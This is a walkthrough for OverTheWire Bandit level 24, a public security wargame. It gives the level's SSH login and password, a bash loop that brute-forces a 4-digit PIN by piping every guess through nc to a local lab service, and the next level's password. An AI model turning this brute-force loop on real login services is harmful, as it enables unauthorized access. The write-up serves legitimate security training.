🎯 Objective:
      Find the 4-digit PIN required by a service running on a local port. You must brute-force it.

Steps to be followed:

Step 1: Login as bandit24

ssh bandit24@bandit.labs.overthewire.org -p 2220
Password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

Step 2: Understand the challenge

There is a service listening on port 30002:
It expects: bandit24_password + space + 4-digit PIN
If the PIN is correct → it returns the bandit25 password

Step 3: Create a brute-force script

Create a script file: nano brute.sh
Type this:
'['
for pin in {0000..9999}
do
  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin"
done | nc localhost 30002
']' (type only the content inside the '[')
(Then) Save & exit. Make it executable:

Command: chmod +x brute.sh

Step 4: Run the brute-force

Command: ./brute.sh
Wait a few seconds. Eventually, you’ll see output like: Correct!
After that the password will be displayed.

Output:

Password for Level 25: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
